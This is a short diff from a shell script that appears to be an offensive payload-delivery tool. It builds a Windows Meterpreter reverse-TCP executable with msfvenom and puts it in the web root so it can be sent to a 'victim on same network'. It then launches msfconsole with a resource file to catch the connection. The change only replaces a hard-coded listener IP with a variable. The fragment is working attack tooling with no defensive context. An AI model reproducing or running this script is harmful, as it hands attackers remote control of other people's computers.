@@ -46,7 +46,7 @@ fi
 if [ "$options" == "2" ];
 then 
 	echo "send it to victim on same network "$ipp"/window.exe"
-	msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.9 lport=1234 -f exe > window.exe
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=$ipp lport=1234 -f exe > window.exe
 	cp window.exe /var/www/html 
 	msfconsole -r mr.rc
 fi
